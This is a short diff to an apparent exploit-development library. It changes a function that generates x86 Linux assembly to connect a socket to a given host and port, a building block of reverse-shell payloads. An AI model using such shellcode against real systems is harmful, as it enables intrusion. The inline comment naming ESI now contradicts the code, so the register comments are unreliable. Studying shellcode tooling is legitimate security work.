@@ -2,7 +2,7 @@ from pwn import ip, htons
 
 def connect(host, port):
     """Args: host, port
-    Connects to host on port.  Leaves socket in EAX."""
+    Connects to host on port.  Leaves socket in EBP."""
     return """
         ;; Connect to %(hostname)s on %(portnum)d
         ;; Socket file descriptor is placed in ESI
@@ -19,7 +19,7 @@ def connect(host, port):
         mov ecx, esp
         int 0x80
 
-        mov esi, eax
+        mov ebp, eax
 
         ;; connect(sock, &addr, sizeof addr); // sizeof addr == 0x10
         push %(host)d
